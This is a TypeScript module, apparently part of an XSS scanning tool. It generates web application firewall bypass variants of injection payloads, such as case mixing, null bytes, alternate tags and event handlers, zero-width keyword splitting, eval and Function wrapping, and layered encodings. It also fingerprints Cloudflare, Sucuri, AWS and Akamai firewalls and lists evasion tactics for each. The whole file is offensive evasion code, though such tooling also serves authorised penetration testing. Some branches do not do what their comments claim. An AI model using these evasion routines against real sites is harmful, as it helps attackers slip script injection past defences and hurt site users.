
import { EncodingType, FilterInfo, HTMLContext } from "@/types/scanner";

// Apply WAF bypass techniques based on detected filters and encodings
export const applyWafBypass = (
  payload: string, 
  context: HTMLContext = 'html',
  detectedFilters: FilterInfo[] = [],
  detectedEncodings: EncodingType[] = []
): string[] => {
  // Start with the original payload
  const bypasses: string[] = [payload];
  
  // Apply context-specific bypasses
  const contextBypasses = getContextSpecificBypasses(payload, context);
  bypasses.push(...contextBypasses);
  
  // Apply filter-specific bypasses
  detectedFilters.forEach(filter => {
    const filterBypasses = getFilterSpecificBypasses(payload, filter.type);
    bypasses.push(...filterBypasses);
  });
  
  // Apply encoding bypasses
  const encodingBypasses = getEncodingBypasses(payload);
  bypasses.push(...encodingBypasses);
  
  // Apply special techniques for script context
  if (context === 'script') {
    bypasses.push(...getScriptContextBypasses(payload));
  }
  
  // Apply special techniques for HTML context
  if (context === 'html') {
    bypasses.push(...getHTMLContextBypasses(payload));
  }
  
  // Apply special techniques for attribute context
  if (context === 'attribute') {
    bypasses.push(...getAttributeContextBypasses(payload));
  }
  
  // Add obfuscation techniques
  bypasses.push(...getObfuscationBypasses(payload, context));
  
  // Remove duplicates and return
  return [...new Set(bypasses)];
};

// Get bypasses specific to HTML context
const getHTMLContextBypasses = (payload: string): string[] => {
  const original = payload;
  const bypasses: string[] = [];
  
  // Tag case variation
  bypasses.push(payload.replace(/<(\/?)(\w+)(.*?)>/g, (match, p1, p2, p3) => {
    return `<${p1}${p2.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('')}${p3}>`;
  }));
  
  // Null byte injection
  bypasses.push(payload.replace(/<(\w+)/g, '<\x00$1'));
  
  // Add non-standard attributes
  bypasses.push(payload.replace(/<(\w+)>/g, '<$1 xyz>'));
  
  // Use unusual event handlers
  if (payload.includes('onerror')) {
    bypasses.push(payload.replace(/onerror/g, 'onmouseover'));
    bypasses.push(payload.replace(/onerror/g, 'onanimationstart'));
    bypasses.push(payload.replace(/onerror/g, 'onpointerover'));
  }
  
  // Use different script tag syntax
  if (payload.includes('<script>')) {
    bypasses.push(payload.replace(/<script>/g, '<script type=text/javascript>'));
    bypasses.push(payload.replace(/<script>/g, '<script/x>'));
  }
  
  // Use alternate tags
  if (payload.includes('<img')) {
    bypasses.push(payload.replace(/<img/g, '<svg'));
    bypasses.push(payload.replace(/<img/g, '<video'));
    bypasses.push(payload.replace(/<img/g, '<iframe'));
  }
  
  // WAF bypass techniques from common WAFs
  bypasses.push(payload.replace(/alert\(1\)/g, 'prompt(1)'));
  bypasses.push(payload.replace(/alert\(1\)/g, 'confirm`1`'));
  
  return bypasses;
};

// Get bypasses specific to script context
const getScriptContextBypasses = (payload: string): string[] => {
  const bypasses: string[] = [];
  
  // String concatenation
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'alert($1)'));
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'al' + 'ert($1)'));
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'al\\u0065rt($1)'));
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'window["al"+"ert"]($1)'));
  
  // Template literals
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'alert`$1`'));
  
  // Using constructor
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'Function("al"+"ert"+"($1)")()'));
  
  // Using setTimeout/setInterval
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'setTimeout("alert($1)")'));
  
  // Using eval
  bypasses.push(payload.replace(/alert\((.*?)\)/g, 'eval("alert($1)")'));
  
  // Using expressions
  bypasses.push(payload.replace(/1/g, '1+1-1'));
  bypasses.push(payload.replace(/1/g, '(+[]+[+[]]+[+!![]])'));
  
  return bypasses;
};

// Get bypasses specific to attribute context
const getAttributeContextBypasses = (payload: string): string[] => {
  const bypasses: string[] = [];
  
  // Quote breaking variations
  bypasses.push(payload.replace(/"/g, '\\"'));
  bypasses.push(payload.replace(/"/g, '&quot;'));
  bypasses.push(payload.replace(/"/g, '&#34;'));
  
  // Event handler variations
  bypasses.push(payload.replace(/on\w+=/g, (match) => `ON${match.substring(2)}`)); // Case variation
  bypasses.push(payload.replace(/on\w+=/g, (match) => `${match.substring(0, 2)}\n${match.substring(2)}`)); // Line break
  
  // Space variations
  bypasses.push(payload.replace(/ /g, '/**/'));
  bypasses.push(payload.replace(/ /g, '\t'));
  bypasses.push(payload.replace(/ /g, '\u00a0')); // Non-breaking space
  
  return bypasses;
};

// Get bypasses specific to a context type
const getContextSpecificBypasses = (payload: string, context: HTMLContext): string[] => {
  switch (context) {
    case 'html':
      return getHTMLContextBypasses(payload);
    case 'script':
      return getScriptContextBypasses(payload);
    case 'attribute':
      return getAttributeContextBypasses(payload);
    default:
      return [];
  }
};

// Get bypasses specific to detected filters
const getFilterSpecificBypasses = (payload: string, filterType: string): string[] => {
  const bypasses: string[] = [];
  
  switch (filterType) {
    case 'strip-tags':
      // Nested tags
      bypasses.push(payload.replace(/<(\w+)>/g, '<$1<>'));
      // Duplicate closing tags
      bypasses.push(payload.replace(/<\/(\w+)>/g, '</$1></$1>'));
      break;
      
    case 'escape-quotes':
      // Unicode quotes
      bypasses.push(payload.replace(/"/g, '\u2028'));
      // Backtick instead of quotes
      bypasses.push(payload.replace(/"/g, '`'));
      break;
      
    case 'html-encode':
      // Double encoding
      bypasses.push(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
      // Unicode alternatives
      bypasses.push(payload.replace(/</g, '\u003c').replace(/>/g, '\u003e'));
      break;
      
    case 'keyword-filter':
      // Split keywords
      bypasses.push(payload.replace(/script/gi, 'scr\u200Dipt'));
      bypasses.push(payload.replace(/alert/gi, 'al\u200Dert'));
      // Alternative functions
      bypasses.push(payload.replace(/alert/gi, 'prompt'));
      bypasses.push(payload.replace(/alert/gi, 'confirm'));
      break;
  }
  
  return bypasses;
};

// Get encoding-based bypasses
const getEncodingBypasses = (payload: string): string[] => {
  const bypasses: string[] = [];
  
  // URL encoding
  bypasses.push(encodeURIComponent(payload));
  
  // HTML encoding
  bypasses.push(payload
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;'));
  
  // Unicode encoding (hex)
  const unicodeHex = payload.split('').map(char => {
    const hex = char.charCodeAt(0).toString(16);
    return `\\u${hex.padStart(4, '0')}`;
  }).join('');
  bypasses.push(unicodeHex);
  
  // Decimal HTML encoding
  const decimalHtml = payload.split('').map(char => {
    return `&#${char.charCodeAt(0)};`;
  }).join('');
  bypasses.push(decimalHtml);
  
  // Hex HTML encoding
  const hexHtml = payload.split('').map(char => {
    return `&#x${char.charCodeAt(0).toString(16)};`;
  }).join('');
  bypasses.push(hexHtml);
  
  // Double encoding
  bypasses.push(encodeURIComponent(encodeURIComponent(payload)));
  
  return bypasses;
};

// Get obfuscation-based bypasses
const getObfuscationBypasses = (payload: string, context: HTMLContext): string[] => {
  const bypasses: string[] = [];
  
  // Add comments
  bypasses.push(payload.replace(/<(\w+)/g, '<$1<!--random-->'));
  
  // Add fake attributes
  bypasses.push(payload.replace(/<(\w+)/g, '<$1 data-x="y"'));
  
  // Use character entities for common characters
  const entityPayload = payload
    .replace(/a/g, '&#97;')
    .replace(/e/g, '&#101;')
    .replace(/i/g, '&#105;')
    .replace(/o/g, '&#111;')
    .replace(/u/g, '&#117;');
  bypasses.push(entityPayload);
  
  // Mix encodings
  const mixedEncoding = payload.split('').map((char, i) => {
    if (i % 3 === 0) return `&#${char.charCodeAt(0)};`;
    if (i % 3 === 1) return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
    return char;
  }).join('');
  bypasses.push(mixedEncoding);
  
  // Use JavaScript prototype pollution for script context
  if (context === 'script') {
    bypasses.push(payload.replace(/alert\(1\)/g, 'Object.prototype.toString=()=>alert(1);[].toString()'));
  }
  
  return bypasses;
};

// Detect WAF presence based on response
export const detectWAF = (responseText: string, responseHeaders: Record<string, string>): WAFInfo | null => {
  // Look for common WAF signatures in headers
  const wafSignatures: Record<string, string> = {
    'x-waf': 'Generic WAF',
    'x-sucuri-id': 'Sucuri WAF',
    'server: cloudflare': 'Cloudflare WAF',
    'x-powered-by: akamai': 'Akamai WAF',
    'x-amz-cf-id': 'AWS WAF',
    '__cfduid': 'Cloudflare WAF',
    'x-iinfo': 'Incapsula WAF',
    'x-mod-security': 'ModSecurity',
    'x-firewall': 'Generic WAF'
  };
  
  // Convert headers to lowercase string for easier searching
  const headerString = Object.entries(responseHeaders)
    .map(([key, value]) => `${key.toLowerCase()}: ${value.toLowerCase()}`)
    .join('\n');
  
  // Check for WAF signatures in headers
  for (const [signature, wafName] of Object.entries(wafSignatures)) {
    if (headerString.includes(signature.toLowerCase())) {
      return {
        detected: true,
        name: wafName,
        confidence: 'high',
        bypassTechniques: getWAFBypassTechniques(wafName)
      };
    }
  }
  
  // Look for common WAF block pages or messages in the response body
  const bodySignatures: [string, string][] = [
    ['blocked by cloudflare', 'Cloudflare WAF'],
    ['sucuri website firewall', 'Sucuri WAF'],
    ['akamai reference architecture', 'Akamai WAF'],
    ['your request has been blocked', 'Generic WAF'],
    ['security incident', 'Generic WAF'],
    ['malicious activity', 'Generic WAF'],
    ['automated request', 'Generic WAF'],
    ['please contact the site administrator', 'Generic WAF'],
    ['access denied', 'Generic WAF'],
    ['firewall protected', 'Generic WAF']
  ];
  
  // Check response text for WAF signatures
  const lowerResponseText = responseText.toLowerCase();
  for (const [signature, wafName] of bodySignatures) {
    if (lowerResponseText.includes(signature)) {
      return {
        detected: true,
        name: wafName,
        confidence: 'medium',
        bypassTechniques: getWAFBypassTechniques(wafName)
      };
    }
  }
  
  // If response code is 403/406/429/456 without typical error page content, might be WAF
  if (responseText.length < 1000 && (
    responseText.includes('403 Forbidden') ||
    responseText.includes('406 Not Acceptable') ||
    responseText.includes('429 Too Many Requests')
  )) {
    return {
      detected: true,
      name: 'Unknown WAF',
      confidence: 'low',
      bypassTechniques: getWAFBypassTechniques('Generic WAF')
    };
  }
  
  return null;
};

interface WAFInfo {
  detected: boolean;
  name: string;
  confidence: 'low' | 'medium' | 'high';
  bypassTechniques: string[];
}

// Get bypass techniques specific to WAF types
const getWAFBypassTechniques = (wafName: string): string[] => {
  switch (wafName) {
    case 'Cloudflare WAF':
      return [
        'Use multi-encoding techniques',
        'Add noise parameters to requests',
        'Modify HTTP headers (User-Agent, Accept)',
        'Use unicode character variations',
        'Space character variations (tab, newline, etc)',
        'Delay between requests'
      ];
    case 'Sucuri WAF':
      return [
        'Use URL path traversal variations',
        'Mix encoding types',
        'HTTP method variations (HEAD, OPTIONS)',
        'Cookies manipulation'
      ];
    case 'AWS WAF':
      return [
        'Use larger payloads to bypass regex limits',
        'Split attacks across multiple parameters',
        'Use valid patterns with nested attacks'
      ];
    case 'Akamai WAF':
      return [
        'Hidden parameter manipulation',
        'Mixed encoding and injection',
        'JSON/XML nested payloads'
      ];
    default: // Generic techniques
      return [
        'Try different encodings',
        'Mix case variations',
        'Insert null bytes or confusing characters',
        'Use alternative tags and attributes',
        'Try different contexts (HTML vs JS vs URL)'
      ];
  }
};
